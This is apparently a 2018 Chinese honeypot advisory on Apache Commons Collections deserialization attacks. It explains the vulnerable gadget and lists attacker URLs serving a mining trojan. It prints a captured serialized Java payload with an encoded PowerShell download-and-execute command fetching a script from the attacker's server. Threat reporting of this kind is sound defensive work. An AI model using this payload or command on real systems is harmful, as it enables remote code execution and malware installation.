---
layout:     post
title:      Apache-Commons-Collections反序列化漏洞通报
subtitle:   Apache-Commons-Collections
date: 2018-08-20
author:     shenzhen_antiy_wly
header-img: img/avatar-by.jpg
catalog: true
tags:
    - honeypot_event
---

# Apache-Commons-Collections反序列化漏洞通报

## 概述

2015年11月6日，FoxGlove Security安全团队的@breenmachine 发布的一篇博客[3]中介绍了如何利用Java反序列化漏洞，来攻击最新版的WebLogic、WebSphere、JBoss、Jenkins、OpenNMS这些大名鼎鼎的Java应用，实现远程代码执行。

2018年8月20日，安天蜜网捕获到利用Apache-Commons-Collections反序列化漏洞的攻击流量，并关联到一个HFS站点，监控到里面有freewin挖矿木马，HFS站点地址为：http://5.63.159.203。

## 漏洞描述

Apache Commons Collections是对已有的JDK数据结构的扩展和补充，是一个JAVA框架

Apache Commons Collections这样的基础库非常多的Java应用都在用，一旦编程人员误用了反序列化这一机制，使得用户输入可以直接被反序列化，就能导致任意代码执行。

出现的问题是由于TransformedMap和InvokerTransformer造成的。

TransformedMap这个类是用来对Map进行某些变换用的，例如当我们修改Map中的某个值时，就会触发我们预先定义好的某些操作来对Map进行处理。

Map transformedMap = TransformedMap.decorate(map, keyTransformer, valueTransformer);

通过decorate函数就可以将一个普通的Map转换为一个TransformedMap。第二个参数和第三个参数分别对应当key改变和value改变时需要做的操作；Transformer是一个接口，实现transform(Object input)方法即可进行实际的变换操作，按照如上代码生成transformedMap后，如果修改了其中的任意key或value，都会调用对应的transform方法去进行一些变换操作。

## 捕获载荷

```
....sr..java.util.HashSet.D.....4...xpw.....?@......sr.4org.apache.commons.collections.keyvalue.TiedMapEntry....9......L..keyt..Ljava/lang/Object;L..mapt..Ljava/util/Map;xpt..foosr.*org.apache.commons.collections.map.LazyMapn....y.....L..factoryt.,Lorg/apache/commons/collections/Transformer;xpsr.:org.apache.commons.collections.functors.ChainedTransformer0...(z.....[..iTransformerst.-[Lorg/apache/commons/collections/Transformer;xpur.-[Lorg.apache.commons.collections.Transformer;.V*..4.....xp....sr.;org.apache.commons.collections.functors.ConstantTransformerXv..A......L..iConstantq.~..xpvr..java.lang.Runtime...........xpsr.:org.apache.commons.collections.functors.InvokerTransformer...k{|.8...[..iArgst..[Ljava/lang/Object;L..iMethodNamet..Ljava/lang/String;[..iParamTypest..[Ljava/lang/Class;xpur..[Ljava.lang.Object;..X..s)l...xp....t..getRuntimeur..[Ljava.lang.Class;......Z....xp....t..getMethoduq.~......vr..java.lang.String...8z;.B...xpvq.~..sq.~..uq.~......puq.~......t..invokeuq.~......vr..java.lang.Object...........xpvq.~..sq.~..uq.~......ur..[Ljava.lang.String;..V...{G...xp....t..cmd.exet../ct.:powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc cABvAHcAZQByAHMAaABlAGwAbAAgAC0AbgBvAHAAIAAtAGMAIAAiAGkAZQB4ACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwA1AC4ANgAzAC4AMQA1ADkALgAyADAAMwAvAHQAZQBzAHQALgBwAHMAMQAnACkAIgA=t..execuq.~......vq.~
```



## 	攻击IP及URL

http://5.63.159.203/test.ps1 

http://5.63.159.203/winpm.ps1 

http://5.63.159.203/freewin

## 样本



| 文件名  | 病毒家族 | Hash                             |
| ------- | -------- | -------------------------------- |
| freewin |          | b4660e3ff7b35aec90586f6857c11f00 |



## 受影响范围



Apache Commons Collections <= 3.2.1，<= 4.0.0





## 修复及防护建议



升级到安全版本的Apache 



## 参考资料



[1]     freebuf 漏洞报告

http://www.freebuf.com/vuls/175252.html